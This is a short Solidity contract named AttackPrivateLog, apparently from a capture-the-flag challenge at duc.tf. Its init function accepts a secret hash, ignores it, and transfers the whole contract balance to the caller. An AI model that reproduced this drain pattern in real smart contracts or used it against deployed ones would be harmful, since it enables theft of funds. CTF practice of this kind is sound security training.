// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @title Private Log
 * @author Blue Alder (https://duc.tf)
 **/

contract AttackPrivateLog {

    function init(bytes32 _secretHash) payable public  {
        uint256 bal = address(this).balance;
        payable(msg.sender).transfer(bal);
    }

}